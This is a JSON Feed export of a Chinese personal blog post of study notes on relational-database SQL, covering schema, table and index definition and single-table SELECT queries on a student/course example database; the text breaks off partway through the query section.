{
    "version": "https://jsonfeed.org/version/1",
    "title": "",
    "subtitle": "",
    "icon": "https://blog.xcu.icu/images/favicon.ico",
    "description": "一个妄想全栈web小废物的博客",
    "home_page_url": "https://blog.xcu.icu",
    "items": [
        {
            "id": "https://blog.xcu.icu/2022/12/03/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E5%87%86%E8%AF%AD%E8%A8%80SQL/",
            "url": "https://blog.xcu.icu/2022/12/03/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E5%87%86%E8%AF%AD%E8%A8%80SQL/",
            "title": "关系数据库标准语言SQL",
            "date_published": "2022-12-02T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>本篇记录学习数据库的第三章，SQL（结构化查询语言）是关系数据的标准语言，也是一个通用的功能性极强的关系性数据库语言，虽然说是查询语言，但是其功能包括但不仅限于数据库数据查询，而是包含了数据库创建，数据库数据的插入，删除，修改和完整性安全性定义等一系列操作。</p>\n<h2 id=\"SQL概述\"><a href=\"#SQL概述\" class=\"headerlink\" title=\"SQL概述\"></a>SQL概述</h2><p>前面也有提到，SQL是结构化查询语言，是关系数据库的标准语言，一个通用的，功能性极强的关系型数据库语言。这里可能会对什么是结构化查询语言的概念比较懵</p>\n<p>结构化查询语言是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统；同时也是数据库脚本文件的扩展名。结构化查询语言是高级的非过程化编程语言，允许用户在高层数据结构上工作。 </p>\n<h3 id=\"SQL的产生\"><a href=\"#SQL的产生\" class=\"headerlink\" title=\"SQL的产生\"></a>SQL的产生</h3><p>SQL是1974年由Boyce和Chamberlin提出的，最初叫sequel，并在IBM公司研制的关系数据库管理系统原型System R上实现。由于SQL<code>简单易学</code>，<code>功能丰富</code>，深受用户及计算机工业界欢迎，因此被数据库厂商所采用。经各公司的不断修改、扩充和完善，SQL得到业界的认可。</p>\n<p>目前，没有一个数据库系统能够支持SQL标准化的所有概念和特性。同时，许多的厂商对SQL基本命令集群进行了不同程度的扩充和修改，使其可以支持更多的功能特性，因此我们在具体使用某个产品的时候，阅读用户手册不可或缺。</p>\n<h3 id=\"SQL的特点\"><a href=\"#SQL的特点\" class=\"headerlink\" title=\"SQL的特点\"></a>SQL的特点</h3><ol>\n<li><p>综合统一</p>\n<ul>\n<li><p>集数据定义语言（DDL），数据查询语言（DQL），数据操作语言（DML），数据控制语言（DCL）功能于一体。</p>\n</li>\n<li><p><strong>可以独立完成数据库生命周期中的全部活动</strong></p>\n<p>包括定义关系模式、插入数据建立数据库、查询、更新、维护、数据库重构、数据库安全性控制等一系列操作</p>\n</li>\n</ul>\n</li>\n<li><p>高度非过程化</p>\n<p>SQL只要提出做什么，无须了解存取路径（存取路径的选取由系统自动完成）</p>\n</li>\n<li><p>面向集合的操作方式</p>\n</li>\n<li><p>意同一种语法结构提供两种使用方法</p>\n<p>（SQL即是自含式语言，又是嵌入式语言）</p>\n</li>\n<li><p>语言简介，易学易用（等于没说【小声哔哔】）</p>\n<p>SQL中完成核心功能只有9个动词</p>\n<table>\n<thead>\n<tr>\n<th>SQL功能</th>\n<th>动词</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>数据查询</td>\n<td>SELECT</td>\n</tr>\n<tr>\n<td>数据定义</td>\n<td>CREATE，DROP，ALTER</td>\n</tr>\n<tr>\n<td>数据操纵</td>\n<td>INSERT，UPDATE，DELETE</td>\n</tr>\n<tr>\n<td>数据控制</td>\n<td>GRANT，REVOKE</td>\n</tr>\n</tbody></table>\n</li>\n</ol>\n<h3 id=\"SQL基本概念\"><a href=\"#SQL基本概念\" class=\"headerlink\" title=\"SQL基本概念\"></a>SQL基本概念</h3><p>支持SQL的关系数据库管理系统同样支持关系数据库的三级模式</p>\n<ul>\n<li>外模式对应视图和部分基本表</li>\n<li>模式对应基本表</li>\n<li>内模式对应存储文件</li>\n</ul>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221130165919850.png\" alt=\"image-20221130165919850\"></p>\n<ol>\n<li><p>基本表</p>\n<ul>\n<li><p>本身独立存在的表</p>\n</li>\n<li><p>SQL中一个关系就对应一个基本表</p>\n</li>\n<li><p>一个（或多个）基本表对应一个储存文件</p>\n</li>\n</ul>\n</li>\n<li><p>存储文件</p>\n<ul>\n<li>物理结构组成了关系数据库的内模式</li>\n<li>物理结构是任意的，对用户透明</li>\n</ul>\n</li>\n<li><p>视图</p>\n<ul>\n<li>从一个或几个基本表导出的表</li>\n<li>数据库中只存放视图的定义没有对应的数据</li>\n<li>视图是一个虚表</li>\n<li>用户可以在视图上面再定义视图</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"数据定义\"><a href=\"#数据定义\" class=\"headerlink\" title=\"数据定义\"></a>数据定义</h2><p>因关系数据库支持三级模式结构，其模式、内模式、外模式中的基本对象有模式，表，视图和索引，故SQL的数据定义功能包括模式定义，表定义，视图和索引的定义。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221130173020187.png\" alt=\"image-20221130173020187\"></p>\n<p>注：一个关系数据库管理系统的实例中可以创建多个数据库，一个数据库里可以创建多个模式，一个模式通常包括多个表，视图和索引等数据库对象。</p>\n<h3 id=\"模式的定义和删除\"><a href=\"#模式的定义和删除\" class=\"headerlink\" title=\"模式的定义和删除\"></a>模式的定义和删除</h3><p><code>定义模式</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">SCHEMA</span> <span class=\"token operator\">&lt;</span>模式名<span class=\"token operator\">></span> <span class=\"token keyword\">AUTHORIZATION</span> <span class=\"token operator\">&lt;</span>用户名<span class=\"token operator\">></span>；\n<span class=\"token keyword\">create</span> <span class=\"token keyword\">schema</span> <span class=\"token operator\">&lt;</span>模式名<span class=\"token operator\">></span> <span class=\"token keyword\">authorization</span> <span class=\"token operator\">&lt;</span>用户名<span class=\"token operator\">></span>；<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>至于这里为什么要写两遍，SQL语言是不区分大小写的，两种都行个人喜欢小写</p>\n<p><code>注：</code></p>\n<ol>\n<li><code>如果没有指定&lt;模式名&gt;，则&lt;模式名&gt;隐含为&lt;用户名&gt;</code></li>\n<li><code>调用该命令的用户需要有数据库管理员的权限，或者被授予create schema的权限</code></li>\n</ol>\n<p>这里的定义模式其实就是定义了一个命名空间，可以进一步的创建表，视图</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">SCHEMA</span> <span class=\"token operator\">&lt;</span>模式名<span class=\"token operator\">></span> <span class=\"token keyword\">AUTHORIZATION</span> <span class=\"token operator\">&lt;</span>用户名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>表定义子句<span class=\"token operator\">></span><span class=\"token operator\">|</span><span class=\"token operator\">&lt;</span>视图定义子句<span class=\"token operator\">></span><span class=\"token operator\">|</span><span class=\"token operator\">&lt;</span>授权定义子句<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">create</span> <span class=\"token keyword\">schema</span> <span class=\"token operator\">&lt;</span>模式名<span class=\"token operator\">></span> <span class=\"token keyword\">authorization</span> <span class=\"token operator\">&lt;</span>用户名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>表定义子句<span class=\"token operator\">></span><span class=\"token operator\">|</span><span class=\"token operator\">&lt;</span>视图定义子句<span class=\"token operator\">></span><span class=\"token operator\">|</span><span class=\"token operator\">&lt;</span>授权定义子句<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><code>注：这里的[]表示这部分可以没有</code></p>\n<p>例如，如果要为用户zhang创建一个模式test，并且在其中定义一个表TAB1</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">SCHEMA</span> TEST <span class=\"token keyword\">AUTHORIZATION</span> zhang <span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> TAB1<span class=\"token punctuation\">(</span>COL1 SNALLINT<span class=\"token punctuation\">,</span>COL2 <span class=\"token keyword\">INT</span><span class=\"token punctuation\">,</span>COL3 <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>删除模式</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DROP</span> <span class=\"token keyword\">SCHEMA</span> <span class=\"token operator\">&lt;</span>模式名<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">CASCADE</span><span class=\"token operator\">|</span><span class=\"token keyword\">RESTRICT</span><span class=\"token operator\">></span>\n<span class=\"token keyword\">drop</span> <span class=\"token keyword\">schema</span> <span class=\"token operator\">&lt;</span>模式名<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">cascade</span><span class=\"token operator\">|</span><span class=\"token keyword\">restrict</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>这里尖括号中的两者必选其一，cascade（级联）表示在删除模式的时候会将该模式下的数据库对象都删除，restrict（限制）如果该模式下面已经定义了数据库对象，则拒绝删除语句的执行。</p>\n<h3 id=\"基本表的定义、删除与修改\"><a href=\"#基本表的定义、删除与修改\" class=\"headerlink\" title=\"基本表的定义、删除与修改\"></a>基本表的定义、删除与修改</h3><h4 id=\"定义基本表\"><a href=\"#定义基本表\" class=\"headerlink\" title=\"定义基本表\"></a>定义基本表</h4><p>使用create table语句</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span>\n<span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>数据类型<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span>列级完整性约束条件<span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>数据类型<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span>列级完整性约束条件<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>\n····\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>建立一个学生表Student</code></p>\n<pre class=\"line-numbers language-SQL\" data-language=\"SQL\"><code class=\"language-SQL\">CREATE TABLE Student (\n\tSno CHAR(9) PRIMARY KEY,&#x2F;*表级约束条件~设置主键*&#x2F;\n    Sname CHAR(20) UNIQUE,&#x2F;*表级约束条件~取唯一值*&#x2F;\n    Ssex CHAR(2),\n    Sage SMALLINT,\n    Sdept CHAR(20)\n)；<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>建立一个“课程”表Course</code></p>\n<pre class=\"line-numbers language-SQL\" data-language=\"SQL\"><code class=\"language-SQL\">CREATE TABLE Course(\n\tCno CHAR(4) PRIMARY KEY,&#x2F;*表级约束条件~设置主键*&#x2F;\n    Cname CHAR(40) NOT NULL,&#x2F;*表级约束条件~不能为空*&#x2F;\n    Cpno CHAR(4),\n    Ccredit SMALLINT,\n    FOREIGN KEY (Cpno) REFERENCES Course(Cno)\n    &#x2F;*表级约束条件，Cpno是外码，被参照表是Course，被参照列是Cno*&#x2F;\n);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>注：参照表和被参照表可以是同一个表</code></p>\n<p><code>建立一个学生选课表SC</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> SC\n<span class=\"token punctuation\">(</span>\n\tSno <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n\tCno <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n\tGrade <span class=\"token keyword\">SMALLINT</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span><span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">,</span>Cno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token comment\">/*主码由两个属性组成必须通过表级约束条件来定义*/</span>\n    <span class=\"token keyword\">FOREIGN</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">)</span> <span class=\"token keyword\">REFERENCES</span> Student<span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token comment\">/*表级约束条件~Sno是外码，参照表是Student*/</span>\n    <span class=\"token keyword\">FOREIGN</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span>Cno<span class=\"token punctuation\">)</span> <span class=\"token keyword\">REFERENCES</span> Course<span class=\"token punctuation\">(</span>Cno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token comment\">/*表级约束条件~Cno是外码，参照表是Couese*/</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h4><p>在上面基本表的定义中提到了数据类型，关系模型中的每一个属性都来自一个域，他的取值必须是域中的值，在SQL中用数据类型来实现</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221130183148691.png\" alt=\"image-20221130183148691\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221130183201344.png\" alt=\"image-20221130183201344\"></p>\n<h4 id=\"模式与表\"><a href=\"#模式与表\" class=\"headerlink\" title=\"模式与表\"></a>模式与表</h4><p>模式与表的关系很简单，每一个表都对应一个模式，一个模式对应多个表</p>\n<h4 id=\"修改基本表\"><a href=\"#修改基本表\" class=\"headerlink\" title=\"修改基本表\"></a>修改基本表</h4><p>使用ALTER TABLE来修改基本表</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">TABLE</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span>\n<span class=\"token punctuation\">[</span><span class=\"token keyword\">ADD</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">COLUMN</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>新列名<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>数据类型<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span>完整性约束条件<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span><span class=\"token keyword\">ADD</span> <span class=\"token operator\">&lt;</span>表级完整性约束条件<span class=\"token operator\">></span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span><span class=\"token keyword\">DROP</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">COLUMN</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">CASCADE</span><span class=\"token operator\">|</span><span class=\"token keyword\">RESTRICT</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span><span class=\"token keyword\">DROP</span> <span class=\"token keyword\">CONSTRAINT</span> <span class=\"token operator\">&lt;</span>完整性约束<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">RESTRICT</span><span class=\"token operator\">|</span><span class=\"token keyword\">CASCADE</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span><span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">COLUMN</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>数据类型<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>ADD</code>用于增加新列、新的完整性约束条件<code>DROP COLUMN</code>子句用于删除表中的列，如果指定了CASCADE则删除引用了该列的其他对象，<code>DROP CONSTRAINT</code>用于删除只能怪的完整性约束条件，<code>ALTER COLUMN</code>子句用于修改原有的列定义</p>\n<p><code>给Student表增加入学时间列，数据类型为日期型</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> Student <span class=\"token keyword\">add</span> S_entrance <span class=\"token keyword\">DATE</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>将年龄的数据类型由字符型改为整型</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> Student <span class=\"token keyword\">alter</span> cloumn Sage <span class=\"token keyword\">INT</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>郑家课程名唯一的约束条件</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> Course <span class=\"token keyword\">add</span> <span class=\"token keyword\">unique</span><span class=\"token punctuation\">(</span>Cname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"删除基本表\"><a href=\"#删除基本表\" class=\"headerlink\" title=\"删除基本表\"></a>删除基本表</h4><p>当一个表不需要的时候我们可以通过</p>\n<pre class=\"line-numbers language-SQL\" data-language=\"SQL\"><code class=\"language-SQL\">DROP TABLE &lt;表名&gt; [RESTRICT|CASCADE];<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>删除Student表</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">drop</span> <span class=\"token keyword\">table</span> Student <span class=\"token keyword\">restrict</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"索引的建立与删除\"><a href=\"#索引的建立与删除\" class=\"headerlink\" title=\"索引的建立与删除\"></a>索引的建立与删除</h3><p>索引的目的是加快数据查询的速度</p>\n<p>使用create index建立索引</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">UNIQUE</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>CLUSTER<span class=\"token punctuation\">]</span> <span class=\"token keyword\">INDEX</span> <span class=\"token operator\">&lt;</span>索引名<span class=\"token operator\">></span> <span class=\"token keyword\">ON</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>次序<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>次序<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>···<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n次序中<span class=\"token keyword\">ASC</span>为升序，<span class=\"token keyword\">DESC</span>为降序（默认是<span class=\"token keyword\">ASC</span>）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><code>为学生课程数据库中的Student，Course，SC三个表建立索引，其中Student表按照学号升序建立唯一索引，Course表按照课程号升序建立唯一索引，SC表中按照学号升序和课程号降序建立唯一索引</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">create</span> <span class=\"token keyword\">unique</span> <span class=\"token keyword\">index</span> Student <span class=\"token keyword\">on</span> Student<span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">create</span> <span class=\"token keyword\">unique</span> <span class=\"token keyword\">index</span> Course <span class=\"token keyword\">on</span> Course<span class=\"token punctuation\">(</span>Cno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">create</span> <span class=\"token keyword\">unique</span> <span class=\"token keyword\">index</span> SC <span class=\"token keyword\">on</span> SC<span class=\"token punctuation\">(</span>Sno <span class=\"token keyword\">ASC</span><span class=\"token punctuation\">,</span>Cno <span class=\"token keyword\">DESC</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><code>注，索引的建立只有建表的人和数据库管理员可以操作，其他的都依靠DBMS自动完成</code></p>\n<h2 id=\"数据查询\"><a href=\"#数据查询\" class=\"headerlink\" title=\"数据查询\"></a>数据查询</h2><p>接下来开始本篇的重点部分，数据的查询其一般格式为：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">ALL</span><span class=\"token operator\">|</span><span class=\"token keyword\">DISTINCT</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>目标列表达式<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>目标列表达式<span class=\"token operator\">></span><span class=\"token punctuation\">]</span>··· <span class=\"token keyword\">FROM</span> <span class=\"token operator\">&lt;</span>表名或者视图名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>表名或者视图名<span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">SELECT</span> 语句<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">AS</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>别名<span class=\"token operator\">></span>\n<span class=\"token punctuation\">[</span><span class=\"token keyword\">WHERE</span> <span class=\"token operator\">&lt;</span>条件表达式<span class=\"token operator\">></span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span><span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token number\">1</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">HAVING</span> <span class=\"token operator\">&lt;</span>条件表达式<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span><span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token number\">2</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">ASC</span><span class=\"token operator\">|</span><span class=\"token keyword\">DESC</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>整个select语句的含义是，根据where子句的条件表达式从from子句指定的基本表，视图或派生表中找出满足条件的元组，再按照select子句中的目标表达式选出元组中的属性值形成的结果表。</p>\n<p><code>ALL</code>表示显示所有结果，<code>DISTINCT</code>表示去除重复的属性，<code>group by</code>子句，将结果按照&lt;列名1&gt;来进行分组，该属性列值相等的元组为一个组通常会在每组中作用聚集函数。如果有<code>having</code>则需要满足指定的条件，<code>order by</code>的作用是将查询的结果排序。</p>\n<p>我的数据库三个表：</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201163315778.png\" alt=\"image-20221201163315778\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201163333243.png\" alt=\"image-20221201163333243\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201163346603.png\" alt=\"image-20221201163346603\"></p>\n<p>查询方式，主要分为下面四种</p>\n<h3 id=\"单表查询\"><a href=\"#单表查询\" class=\"headerlink\" title=\"单表查询\"></a>单表查询</h3><p>查询仅涉及一个表，查询中常需要一些条件，下表中总结了常用的查询条件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201140948099.png\" alt=\"image-20221201140948099\"></p>\n<ol>\n<li><p>查询表中的若干列</p>\n<ul>\n<li><p>类似投影</p>\n</li>\n<li><p><code>查询全体学生的学号和姓名</code>（查询指定列）</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sno<span class=\"token punctuation\">,</span>Sname <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201132002432.png\" alt=\"image-20221201132002432\"></p>\n</li>\n<li><p><code>查询全体学生的详细记录</code>（查询全部列）</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">;</span><span class=\"token comment\">/*这里的*代表查询所有*/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201132332402.png\" alt=\"image-20221201132332402\"></p>\n</li>\n<li><p><code>查询全体学生的姓名及出生年月</code>（查询经过计算的值）</p>\n<p><font color=\"red\">select子句中的&lt;目标列表达式&gt;不仅可以是属性列，也可以是表达式，还可以是支付穿常量，函数等</font></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span><span class=\"token number\">2022</span><span class=\"token operator\">-</span>Sage <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201132913026.png\" alt=\"image-20221201132913026\"></p>\n</li>\n<li><p>查询全体学生姓名，出生年月和所在院系，使用小写字母表示系名</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sname<span class=\"token punctuation\">,</span><span class=\"token string\">'出生年：'</span><span class=\"token punctuation\">,</span><span class=\"token number\">2022</span><span class=\"token operator\">-</span>Sage<span class=\"token punctuation\">,</span>LOWER<span class=\"token punctuation\">(</span>Sdept<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> Student<span class=\"token punctuation\">;</span><span class=\"token comment\">/*这里LOWER表示转化为小写，对应的有UPPER转化为大写*/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221201134153565.png\" alt=\"image-20221201134153565\"></p>\n<p><font color=blue>这里字符串用单引号包裹</font></p>\n</li>\n<li><p><code>对上一个例子的查询结果进行别名</code><br>用as进行别名（<font color=red>可以省略</font>）</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> Sname <span 